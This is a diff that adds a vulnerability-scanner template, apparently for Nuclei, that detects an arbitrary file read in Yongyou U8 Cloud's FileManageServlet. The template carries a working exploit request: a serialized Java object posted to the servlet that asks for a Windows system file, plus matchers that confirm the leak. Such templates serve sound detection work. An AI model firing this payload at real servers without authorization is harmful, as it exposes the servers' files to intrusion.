@@ -1,0 +1,39 @@
+id: yongyou-u8cloud-filemanageservlet-anyfile-read
+info:
+  name: Yongyou U8 Cloud FileManageServlet Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template detects an arbitrary file read vulnerability in the Yongyou U8 Cloud FileManageServlet.
+
+variables:
+  t1: "{{urldecode('\\xac\\xed\\x00\\x05sr\\x00\\x11java.util.HashMap\\x05\\x07\\xda\\xc1\\xc3\\x16`\\xd1\\x03\\x00\\x02F\\x00\\x0aloadFactorI\\x00\\x09thresholdxp?@\\x00\\x00\\x00\\x00\\x00\\x0cw\\x08\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x03t\\x00\\x04patht\\x00\\x12C:\\Windows\\win.init\\x00\\x06dsNamet\\x00\\x03plmt\\x00\\x08operTypet\\x00\\x0ddownloadlocalx')}}"
+
+http:
+  - raw:
+      - |
+        POST /service/FileManageServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/octet-stream
+
+        {{t1}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "[fonts]"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - ".server"
